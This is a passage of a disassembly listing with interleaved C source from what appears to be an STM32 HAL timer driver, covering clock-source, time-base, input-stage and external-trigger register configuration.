 80052dc:	2b20      	cmp	r3, #32
 80052de:	d867      	bhi.n	80053b0 <HAL_TIM_ConfigClockSource+0x170>
 80052e0:	2b00      	cmp	r3, #0
 80052e2:	d05c      	beq.n	800539e <HAL_TIM_ConfigClockSource+0x15e>
 80052e4:	2b10      	cmp	r3, #16
 80052e6:	d05a      	beq.n	800539e <HAL_TIM_ConfigClockSource+0x15e>
 80052e8:	e062      	b.n	80053b0 <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 80052ea:	687b      	ldr	r3, [r7, #4]
 80052ec:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 80052ee:	683b      	ldr	r3, [r7, #0]
 80052f0:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 80052f2:	683b      	ldr	r3, [r7, #0]
 80052f4:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 80052f6:	683b      	ldr	r3, [r7, #0]
 80052f8:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 80052fa:	f000 f971 	bl	80055e0 <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 80052fe:	687b      	ldr	r3, [r7, #4]
 8005300:	681b      	ldr	r3, [r3, #0]
 8005302:	689b      	ldr	r3, [r3, #8]
 8005304:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 8005306:	68bb      	ldr	r3, [r7, #8]
 8005308:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 800530c:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 800530e:	687b      	ldr	r3, [r7, #4]
 8005310:	681b      	ldr	r3, [r3, #0]
 8005312:	68ba      	ldr	r2, [r7, #8]
 8005314:	609a      	str	r2, [r3, #8]
      break;
 8005316:	e04f      	b.n	80053b8 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 8005318:	687b      	ldr	r3, [r7, #4]
 800531a:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 800531c:	683b      	ldr	r3, [r7, #0]
 800531e:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 8005320:	683b      	ldr	r3, [r7, #0]
 8005322:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 8005324:	683b      	ldr	r3, [r7, #0]
 8005326:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 8005328:	f000 f95a 	bl	80055e0 <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 800532c:	687b      	ldr	r3, [r7, #4]
 800532e:	681b      	ldr	r3, [r3, #0]
 8005330:	689a      	ldr	r2, [r3, #8]
 8005332:	687b      	ldr	r3, [r7, #4]
 8005334:	681b      	ldr	r3, [r3, #0]
 8005336:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 800533a:	609a      	str	r2, [r3, #8]
      break;
 800533c:	e03c      	b.n	80053b8 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 800533e:	687b      	ldr	r3, [r7, #4]
 8005340:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005342:	683b      	ldr	r3, [r7, #0]
 8005344:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005346:	683b      	ldr	r3, [r7, #0]
 8005348:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800534a:	461a      	mov	r2, r3
 800534c:	f000 f8ce 	bl	80054ec <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 8005350:	687b      	ldr	r3, [r7, #4]
 8005352:	681b      	ldr	r3, [r3, #0]
 8005354:	2150      	movs	r1, #80	; 0x50
 8005356:	4618      	mov	r0, r3
 8005358:	f000 f927 	bl	80055aa <TIM_ITRx_SetConfig>
      break;
 800535c:	e02c      	b.n	80053b8 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 800535e:	687b      	ldr	r3, [r7, #4]
 8005360:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005362:	683b      	ldr	r3, [r7, #0]
 8005364:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005366:	683b      	ldr	r3, [r7, #0]
 8005368:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 800536a:	461a      	mov	r2, r3
 800536c:	f000 f8ed 	bl	800554a <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 8005370:	687b      	ldr	r3, [r7, #4]
 8005372:	681b      	ldr	r3, [r3, #0]
 8005374:	2160      	movs	r1, #96	; 0x60
 8005376:	4618      	mov	r0, r3
 8005378:	f000 f917 	bl	80055aa <TIM_ITRx_SetConfig>
      break;
 800537c:	e01c      	b.n	80053b8 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 800537e:	687b      	ldr	r3, [r7, #4]
 8005380:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 8005382:	683b      	ldr	r3, [r7, #0]
 8005384:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005386:	683b      	ldr	r3, [r7, #0]
 8005388:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 800538a:	461a      	mov	r2, r3
 800538c:	f000 f8ae 	bl	80054ec <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 8005390:	687b      	ldr	r3, [r7, #4]
 8005392:	681b      	ldr	r3, [r3, #0]
 8005394:	2140      	movs	r1, #64	; 0x40
 8005396:	4618      	mov	r0, r3
 8005398:	f000 f907 	bl	80055aa <TIM_ITRx_SetConfig>
      break;
 800539c:	e00c      	b.n	80053b8 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 800539e:	687b      	ldr	r3, [r7, #4]
 80053a0:	681a      	ldr	r2, [r3, #0]
 80053a2:	683b      	ldr	r3, [r7, #0]
 80053a4:	681b      	ldr	r3, [r3, #0]
 80053a6:	4619      	mov	r1, r3
 80053a8:	4610      	mov	r0, r2
 80053aa:	f000 f8fe 	bl	80055aa <TIM_ITRx_SetConfig>
      break;
 80053ae:	e003      	b.n	80053b8 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 80053b0:	2301      	movs	r3, #1
 80053b2:	73fb      	strb	r3, [r7, #15]
      break;
 80053b4:	e000      	b.n	80053b8 <HAL_TIM_ConfigClockSource+0x178>
      break;
 80053b6:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 80053b8:	687b      	ldr	r3, [r7, #4]
 80053ba:	2201      	movs	r2, #1
 80053bc:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 80053c0:	687b      	ldr	r3, [r7, #4]
 80053c2:	2200      	movs	r2, #0
 80053c4:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 80053c8:	7bfb      	ldrb	r3, [r7, #15]
}
 80053ca:	4618      	mov	r0, r3
 80053cc:	3710      	adds	r7, #16
 80053ce:	46bd      	mov	sp, r7
 80053d0:	bd80      	pop	{r7, pc}

080053d2 <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 80053d2:	b480      	push	{r7}
 80053d4:	b083      	sub	sp, #12
 80053d6:	af00      	add	r7, sp, #0
 80053d8:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 80053da:	bf00      	nop
 80053dc:	370c      	adds	r7, #12
 80053de:	46bd      	mov	sp, r7
 80053e0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053e4:	4770      	bx	lr

080053e6 <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 80053e6:	b480      	push	{r7}
 80053e8:	b083      	sub	sp, #12
 80053ea:	af00      	add	r7, sp, #0
 80053ec:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 80053ee:	bf00      	nop
 80053f0:	370c      	adds	r7, #12
 80053f2:	46bd      	mov	sp, r7
 80053f4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80053f8:	4770      	bx	lr

080053fa <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 80053fa:	b480      	push	{r7}
 80053fc:	b083      	sub	sp, #12
 80053fe:	af00      	add	r7, sp, #0
 8005400:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 8005402:	bf00      	nop
 8005404:	370c      	adds	r7, #12
 8005406:	46bd      	mov	sp, r7
 8005408:	f85d 7b04 	ldr.w	r7, [sp], #4
 800540c:	4770      	bx	lr

0800540e <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 800540e:	b480      	push	{r7}
 8005410:	b083      	sub	sp, #12
 8005412:	af00      	add	r7, sp, #0
 8005414:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 8005416:	bf00      	nop
 8005418:	370c      	adds	r7, #12
 800541a:	46bd      	mov	sp, r7
 800541c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005420:	4770      	bx	lr
	...

08005424 <TIM_Base_SetConfig>:
  * @param  TIMx TIM peripheral
  * @param  Structure TIM Base configuration structure
  * @retval None
  */
void TIM_Base_SetConfig(TIM_TypeDef *TIMx, const TIM_Base_InitTypeDef *Structure)
{
 8005424:	b480      	push	{r7}
 8005426:	b085      	sub	sp, #20
 8005428:	af00      	add	r7, sp, #0
 800542a:	6078      	str	r0, [r7, #4]
 800542c:	6039      	str	r1, [r7, #0]
  uint32_t tmpcr1;
  tmpcr1 = TIMx->CR1;
 800542e:	687b      	ldr	r3, [r7, #4]
 8005430:	681b      	ldr	r3, [r3, #0]
 8005432:	60fb      	str	r3, [r7, #12]

  /* Set TIM Time Base Unit parameters ---------------------------------------*/
  if (IS_TIM_COUNTER_MODE_SELECT_INSTANCE(TIMx))
 8005434:	687b      	ldr	r3, [r7, #4]
 8005436:	4a2a      	ldr	r2, [pc, #168]	; (80054e0 <TIM_Base_SetConfig+0xbc>)
 8005438:	4293      	cmp	r3, r2
 800543a:	d003      	beq.n	8005444 <TIM_Base_SetConfig+0x20>
 800543c:	687b      	ldr	r3, [r7, #4]
 800543e:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005442:	d108      	bne.n	8005456 <TIM_Base_SetConfig+0x32>
  {
    /* Select the Counter Mode */
    tmpcr1 &= ~(TIM_CR1_DIR | TIM_CR1_CMS);
 8005444:	68fb      	ldr	r3, [r7, #12]
 8005446:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800544a:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= Structure->CounterMode;
 800544c:	683b      	ldr	r3, [r7, #0]
 800544e:	685b      	ldr	r3, [r3, #4]
 8005450:	68fa      	ldr	r2, [r7, #12]
 8005452:	4313      	orrs	r3, r2
 8005454:	60fb      	str	r3, [r7, #12]
  }

  if (IS_TIM_CLOCK_DIVISION_INSTANCE(TIMx))
 8005456:	687b      	ldr	r3, [r7, #4]
 8005458:	4a21      	ldr	r2, [pc, #132]	; (80054e0 <TIM_Base_SetConfig+0xbc>)
 800545a:	4293      	cmp	r3, r2
 800545c:	d00b      	beq.n	8005476 <TIM_Base_SetConfig+0x52>
 800545e:	687b      	ldr	r3, [r7, #4]
 8005460:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8005464:	d007      	beq.n	8005476 <TIM_Base_SetConfig+0x52>
 8005466:	687b      	ldr	r3, [r7, #4]
 8005468:	4a1e      	ldr	r2, [pc, #120]	; (80054e4 <TIM_Base_SetConfig+0xc0>)
 800546a:	4293      	cmp	r3, r2
 800546c:	d003      	beq.n	8005476 <TIM_Base_SetConfig+0x52>
 800546e:	687b      	ldr	r3, [r7, #4]
 8005470:	4a1d      	ldr	r2, [pc, #116]	; (80054e8 <TIM_Base_SetConfig+0xc4>)
 8005472:	4293      	cmp	r3, r2
 8005474:	d108      	bne.n	8005488 <TIM_Base_SetConfig+0x64>
  {
    /* Set the clock division */
    tmpcr1 &= ~TIM_CR1_CKD;
 8005476:	68fb      	ldr	r3, [r7, #12]
 8005478:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 800547c:	60fb      	str	r3, [r7, #12]
    tmpcr1 |= (uint32_t)Structure->ClockDivision;
 800547e:	683b      	ldr	r3, [r7, #0]
 8005480:	68db      	ldr	r3, [r3, #12]
 8005482:	68fa      	ldr	r2, [r7, #12]
 8005484:	4313      	orrs	r3, r2
 8005486:	60fb      	str	r3, [r7, #12]
  }

  /* Set the auto-reload preload */
  MODIFY_REG(tmpcr1, TIM_CR1_ARPE, Structure->AutoReloadPreload);
 8005488:	68fb      	ldr	r3, [r7, #12]
 800548a:	f023 0280 	bic.w	r2, r3, #128	; 0x80
 800548e:	683b      	ldr	r3, [r7, #0]
 8005490:	695b      	ldr	r3, [r3, #20]
 8005492:	4313      	orrs	r3, r2
 8005494:	60fb      	str	r3, [r7, #12]

  TIMx->CR1 = tmpcr1;
 8005496:	687b      	ldr	r3, [r7, #4]
 8005498:	68fa      	ldr	r2, [r7, #12]
 800549a:	601a      	str	r2, [r3, #0]

  /* Set the Autoreload value */
  TIMx->ARR = (uint32_t)Structure->Period ;
 800549c:	683b      	ldr	r3, [r7, #0]
 800549e:	689a      	ldr	r2, [r3, #8]
 80054a0:	687b      	ldr	r3, [r7, #4]
 80054a2:	62da      	str	r2, [r3, #44]	; 0x2c

  /* Set the Prescaler value */
  TIMx->PSC = Structure->Prescaler;
 80054a4:	683b      	ldr	r3, [r7, #0]
 80054a6:	681a      	ldr	r2, [r3, #0]
 80054a8:	687b      	ldr	r3, [r7, #4]
 80054aa:	629a      	str	r2, [r3, #40]	; 0x28

  if (IS_TIM_REPETITION_COUNTER_INSTANCE(TIMx))
 80054ac:	687b      	ldr	r3, [r7, #4]
 80054ae:	4a0c      	ldr	r2, [pc, #48]	; (80054e0 <TIM_Base_SetConfig+0xbc>)
 80054b0:	4293      	cmp	r3, r2
 80054b2:	d007      	beq.n	80054c4 <TIM_Base_SetConfig+0xa0>
 80054b4:	687b      	ldr	r3, [r7, #4]
 80054b6:	4a0b      	ldr	r2, [pc, #44]	; (80054e4 <TIM_Base_SetConfig+0xc0>)
 80054b8:	4293      	cmp	r3, r2
 80054ba:	d003      	beq.n	80054c4 <TIM_Base_SetConfig+0xa0>
 80054bc:	687b      	ldr	r3, [r7, #4]
 80054be:	4a0a      	ldr	r2, [pc, #40]	; (80054e8 <TIM_Base_SetConfig+0xc4>)
 80054c0:	4293      	cmp	r3, r2
 80054c2:	d103      	bne.n	80054cc <TIM_Base_SetConfig+0xa8>
  {
    /* Set the Repetition Counter value */
    TIMx->RCR = Structure->RepetitionCounter;
 80054c4:	683b      	ldr	r3, [r7, #0]
 80054c6:	691a      	ldr	r2, [r3, #16]
 80054c8:	687b      	ldr	r3, [r7, #4]
 80054ca:	631a      	str	r2, [r3, #48]	; 0x30
  }

  /* Generate an update event to reload the Prescaler
     and the repetition counter (only for advanced timer) value immediately */
  TIMx->EGR = TIM_EGR_UG;
 80054cc:	687b      	ldr	r3, [r7, #4]
 80054ce:	2201      	movs	r2, #1
 80054d0:	615a      	str	r2, [r3, #20]
}
 80054d2:	bf00      	nop
 80054d4:	3714      	adds	r7, #20
 80054d6:	46bd      	mov	sp, r7
 80054d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80054dc:	4770      	bx	lr
 80054de:	bf00      	nop
 80054e0:	40012c00 	.word	0x40012c00
 80054e4:	40014000 	.word	0x40014000
 80054e8:	40014400 	.word	0x40014400

080054ec <TIM_TI1_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI1_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 80054ec:	b480      	push	{r7}
 80054ee:	b087      	sub	sp, #28
 80054f0:	af00      	add	r7, sp, #0
 80054f2:	60f8      	str	r0, [r7, #12]
 80054f4:	60b9      	str	r1, [r7, #8]
 80054f6:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 1: Reset the CC1E Bit */
  tmpccer = TIMx->CCER;
 80054f8:	68fb      	ldr	r3, [r7, #12]
 80054fa:	6a1b      	ldr	r3, [r3, #32]
 80054fc:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC1E;
 80054fe:	68fb      	ldr	r3, [r7, #12]
 8005500:	6a1b      	ldr	r3, [r3, #32]
 8005502:	f023 0201 	bic.w	r2, r3, #1
 8005506:	68fb      	ldr	r3, [r7, #12]
 8005508:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 800550a:	68fb      	ldr	r3, [r7, #12]
 800550c:	699b      	ldr	r3, [r3, #24]
 800550e:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC1F;
 8005510:	693b      	ldr	r3, [r7, #16]
 8005512:	f023 03f0 	bic.w	r3, r3, #240	; 0xf0
 8005516:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 4U);
 8005518:	687b      	ldr	r3, [r7, #4]
 800551a:	011b      	lsls	r3, r3, #4
 800551c:	693a      	ldr	r2, [r7, #16]
 800551e:	4313      	orrs	r3, r2
 8005520:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC1E Bit */
  tmpccer &= ~(TIM_CCER_CC1P | TIM_CCER_CC1NP);
 8005522:	697b      	ldr	r3, [r7, #20]
 8005524:	f023 030a 	bic.w	r3, r3, #10
 8005528:	617b      	str	r3, [r7, #20]
  tmpccer |= TIM_ICPolarity;
 800552a:	697a      	ldr	r2, [r7, #20]
 800552c:	68bb      	ldr	r3, [r7, #8]
 800552e:	4313      	orrs	r3, r2
 8005530:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1;
 8005532:	68fb      	ldr	r3, [r7, #12]
 8005534:	693a      	ldr	r2, [r7, #16]
 8005536:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005538:	68fb      	ldr	r3, [r7, #12]
 800553a:	697a      	ldr	r2, [r7, #20]
 800553c:	621a      	str	r2, [r3, #32]
}
 800553e:	bf00      	nop
 8005540:	371c      	adds	r7, #28
 8005542:	46bd      	mov	sp, r7
 8005544:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005548:	4770      	bx	lr

0800554a <TIM_TI2_ConfigInputStage>:
  * @param  TIM_ICFilter Specifies the Input Capture Filter.
  *          This parameter must be a value between 0x00 and 0x0F.
  * @retval None
  */
static void TIM_TI2_ConfigInputStage(TIM_TypeDef *TIMx, uint32_t TIM_ICPolarity, uint32_t TIM_ICFilter)
{
 800554a:	b480      	push	{r7}
 800554c:	b087      	sub	sp, #28
 800554e:	af00      	add	r7, sp, #0
 8005550:	60f8      	str	r0, [r7, #12]
 8005552:	60b9      	str	r1, [r7, #8]
 8005554:	607a      	str	r2, [r7, #4]
  uint32_t tmpccmr1;
  uint32_t tmpccer;

  /* Disable the Channel 2: Reset the CC2E Bit */
  tmpccer = TIMx->CCER;
 8005556:	68fb      	ldr	r3, [r7, #12]
 8005558:	6a1b      	ldr	r3, [r3, #32]
 800555a:	617b      	str	r3, [r7, #20]
  TIMx->CCER &= ~TIM_CCER_CC2E;
 800555c:	68fb      	ldr	r3, [r7, #12]
 800555e:	6a1b      	ldr	r3, [r3, #32]
 8005560:	f023 0210 	bic.w	r2, r3, #16
 8005564:	68fb      	ldr	r3, [r7, #12]
 8005566:	621a      	str	r2, [r3, #32]
  tmpccmr1 = TIMx->CCMR1;
 8005568:	68fb      	ldr	r3, [r7, #12]
 800556a:	699b      	ldr	r3, [r3, #24]
 800556c:	613b      	str	r3, [r7, #16]

  /* Set the filter */
  tmpccmr1 &= ~TIM_CCMR1_IC2F;
 800556e:	693b      	ldr	r3, [r7, #16]
 8005570:	f423 4370 	bic.w	r3, r3, #61440	; 0xf000
 8005574:	613b      	str	r3, [r7, #16]
  tmpccmr1 |= (TIM_ICFilter << 12U);
 8005576:	687b      	ldr	r3, [r7, #4]
 8005578:	031b      	lsls	r3, r3, #12
 800557a:	693a      	ldr	r2, [r7, #16]
 800557c:	4313      	orrs	r3, r2
 800557e:	613b      	str	r3, [r7, #16]

  /* Select the Polarity and set the CC2E Bit */
  tmpccer &= ~(TIM_CCER_CC2P | TIM_CCER_CC2NP);
 8005580:	697b      	ldr	r3, [r7, #20]
 8005582:	f023 03a0 	bic.w	r3, r3, #160	; 0xa0
 8005586:	617b      	str	r3, [r7, #20]
  tmpccer |= (TIM_ICPolarity << 4U);
 8005588:	68bb      	ldr	r3, [r7, #8]
 800558a:	011b      	lsls	r3, r3, #4
 800558c:	697a      	ldr	r2, [r7, #20]
 800558e:	4313      	orrs	r3, r2
 8005590:	617b      	str	r3, [r7, #20]

  /* Write to TIMx CCMR1 and CCER registers */
  TIMx->CCMR1 = tmpccmr1 ;
 8005592:	68fb      	ldr	r3, [r7, #12]
 8005594:	693a      	ldr	r2, [r7, #16]
 8005596:	619a      	str	r2, [r3, #24]
  TIMx->CCER = tmpccer;
 8005598:	68fb      	ldr	r3, [r7, #12]
 800559a:	697a      	ldr	r2, [r7, #20]
 800559c:	621a      	str	r2, [r3, #32]
}
 800559e:	bf00      	nop
 80055a0:	371c      	adds	r7, #28
 80055a2:	46bd      	mov	sp, r7
 80055a4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80055a8:	4770      	bx	lr

080055aa <TIM_ITRx_SetConfig>:
  *            @arg TIM_TS_TI2FP2: Filtered Timer Input 2
  *            @arg TIM_TS_ETRF: External Trigger input
  * @retval None
  */
static void TIM_ITRx_SetConfig(TIM_TypeDef *TIMx, uint32_t InputTriggerSource)
{
 80055aa:	b480      	push	{r7}
 80055ac:	b085      	sub	sp, #20
 80055ae:	af00      	add	r7, sp, #0
 80055b0:	6078      	str	r0, [r7, #4]
 80055b2:	6039      	str	r1, [r7, #0]
  uint32_t tmpsmcr;

  /* Get the TIMx SMCR register value */
  tmpsmcr = TIMx->SMCR;
 80055b4:	687b      	ldr	r3, [r7, #4]
 80055b6:	689b      	ldr	r3, [r3, #8]
 80055b8:	60fb      	str	r3, [r7, #12]
  /* Reset the TS Bits */
  tmpsmcr &= ~TIM_SMCR_TS;
 80055ba:	68fb      	ldr	r3, [r7, #12]
 80055bc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80055c0:	60fb      	str	r3, [r7, #12]
  /* Set the Input Trigger source and the slave mode*/
  tmpsmcr |= (InputTriggerSource | TIM_SLAVEMODE_EXTERNAL1);
 80055c2:	683a      	ldr	r2, [r7, #0]
 80055c4:	68fb      	ldr	r3, [r7, #12]
 80055c6:	4313      	orrs	r3, r2
 80055c8:	f043 0307 	orr.w	r3, r3, #7
 80055cc:	60fb      	str	r3, [r7, #12]
  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 80055ce:	687b      	ldr	r3, [r7, #4]
 80055d0:	68fa      	ldr	r2, [r7, #12]
 80055d2:	609a      	str	r2, [r3, #8]
}
 80055d4:	bf00      	nop
 80055d6:	3714      	adds	r7, #20
 80055d8:	46bd      	mov	sp, r7
 80055da:	f85d 7b04 	ldr.w	r7, [sp], #4
 80055de:	4770      	bx	lr

080055e0 <TIM_ETR_SetConfig>:
  *          This parameter must be a value between 0x00 and 0x0F
  * @retval None
  */
void TIM_ETR_SetConfig(TIM_TypeDef *TIMx, uint32_t TIM_ExtTRGPrescaler,
                       uint32_t TIM_ExtTRGPolarity, uint32_t ExtTRGFilter)
{
 80055e0:	b480      	push	{r7}
 80055e2:	b087      	sub	sp, #28
 80055e4:	af00      	add	r7, sp, #0
 80055e6:	60f8      	str	r0, [r7, #12]
 80055e8:	60b9      	str	r1, [r7, #8]
 80055ea:	607a      	str	r2, [r7, #4]
 80055ec:	603b      	str	r3, [r7, #0]
  uint32_t tmpsmcr;

  tmpsmcr = TIMx->SMCR;
 80055ee:	68fb      	ldr	r3, [r7, #12]
 80055f0:	689b      	ldr	r3, [r3, #8]
 80055f2:	617b      	str	r3, [r7, #20]

  /* Reset the ETR Bits */
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 80055f4:	697b      	ldr	r3, [r7, #20]
 80055f6:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 80055fa:	617b      	str	r3, [r7, #20]

  /* Set the Prescaler, the Filter value and the Polarity */
  tmpsmcr |= (uint32_t)(TIM_ExtTRGPrescaler | (TIM_ExtTRGPolarity | (ExtTRGFilter << 8U)));
 80055fc:	683b      	ldr	r3, [r7, #0]
 80055fe:	021a      	lsls	r2, r3, #8
 8005600:	687b      	ldr	r3, [r7, #4]
 8005602:	431a      	orrs	r2, r3
 8005604:	68bb      	ldr	r3, [r7, #8]
 8005606:	4313      	orrs	r3, r2
 8005608:	697a      	ldr	r2, [r7, #20]
 800560a:	4313      	orrs	r3, r2
 800560c:	617b      	str	r3, [r7, #20]

  /* Write to TIMx SMCR */
  TIMx->SMCR = tmpsmcr;
 800560e:	68fb      	ldr	r3, [r7, #12]
 8005610:	697a      	ldr	r2, [r7, #20]
 8005612:	609a      	str	r2, [r3, #8]
}
 8005614:	bf00      	nop
 8005616:	371c      	adds	r7, #28
 8005618:	46bd      	mov	sp, r7
 800561a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800561e:	4770      	bx	lr

08005620 <HAL_TIMEx_MasterConfigSynchronization>:
  *         mode.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIMEx_MasterConfigSynchronization(TIM_HandleTypeDef *htim,
                                                        const TIM_MasterConfigTypeDef *sMasterConfig)
{
 8005620:	b480      	push	{r7}
 8005622:	b085      	sub	sp, #20
 8005624:	af00      	add	r7, sp, #0
 8005626:	6078      	str	r0, [r7, #4]
 8005628:	6039      	str	r1, [r7, #0]
  assert_param(IS_TIM_MASTER_INSTANCE(htim->Instance));
  assert_param(IS_TIM_TRGO_SOURCE(sMasterConfig->MasterOutputTrigger));
  assert_param(IS_TIM_MSM_STATE(sMasterConfig->MasterSlaveMode));

  /* Check input state */
  __HAL_LOCK(htim);
 800562a:	687b      	ldr	r3, [r7, #4]
 800562c:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
